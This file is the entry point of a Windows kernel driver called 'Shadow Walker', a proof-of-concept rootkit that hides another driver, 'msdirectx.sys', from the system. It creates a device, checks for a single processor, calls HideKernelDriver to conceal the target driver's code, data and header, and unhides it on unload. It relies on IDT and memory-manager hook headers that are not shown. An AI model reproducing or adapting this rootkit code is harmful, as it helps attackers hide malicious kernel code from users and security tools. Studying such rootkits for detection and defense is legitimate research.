
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
// Shadow Walker ;)
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

extern "C"
{
	#include "ntddk.h"
}

#include "idtHook.h"
#include "DriverEntry.h"
#include "mmHook.h"
#include "module.h"

PVOID pExecuteView1 = NULL;
int success = 0;

//@@@@@@@@@@@@@@@@@@@@@@@@
// IRQL = passive level
//@@@@@@@@@@@@@@@@@@@@@@@@
extern "C" NTSTATUS DriverEntry( IN PDRIVER_OBJECT  pDriverObject, IN PUNICODE_STRING RegistryPath )
{	
	NTSTATUS Status = 0;
	
	DbgPrint( "Proof Of Concept Driver Hider - DriverEntry\nCompiled at " __TIME__ " on " __DATE__ "\n" );
 		
	//Register the unload routine
	pDriverObject->DriverUnload = OnUnload; 

	/////////////////////////////////////////////
	//Create the device object...
	/////////////////////////////////////////////

	//Initalize the device name
	UNICODE_STRING puDeviceName;
    RtlInitUnicodeString ( &puDeviceName, deviceName );

   	//Create the device
	PDEVICE_OBJECT pDeviceObject = {0};
	Status = IoCreateDevice( pDriverObject, 0, &(UNICODE_STRING) puDeviceName, 
							 FILE_DEVICE_UNKNOWN, 0, true, &pDeviceObject );

	if( STATUS_SUCCESS != Status )
		return Status;

	DbgPrint("Device Created Successully...\n");

	/////////////////////////////////////////////////////////////
	//Test for hyperthreading or MP systems - we don't support them!
	//////////////////////////////////////////////////////////////
	KAFFINITY NumberOfProcessors = KeQueryActiveProcessors();

	for(int n=0; NumberOfProcessors; NumberOfProcessors >>= 1)
    {
		if (NumberOfProcessors & 1) 
			n++;
	}//end for

	DbgPrint("Number of processors = %d \n",n);

	if( n == 1 )
		success = HideKernelDriver( "msdirectx.sys", HIDE_DATA | HIDE_CODE | HIDE_HEADER );
	else
		DbgPrint("Unable to install memory hook. Hyperthreading / multi-processor systems are not supported!\n");

	DbgPrint( "Exiting Driver Entry......\n" );
	return STATUS_SUCCESS;
}//end DriverEntry

//@@@@@@@@@@@@@@@@@@@@@@@@
// IRQL = passive level
//@@@@@@@@@@@@@@@@@@@@@@@@
VOID OnUnload( IN PDRIVER_OBJECT pDriverObject )
{
	//__asm int 1
	if( success == 1 )
		UnhideKernelDriver();
	
	IoDeleteDevice( pDriverObject->DeviceObject );
	DbgPrint( "Unloading..." ); 
	return;
}//end Unload




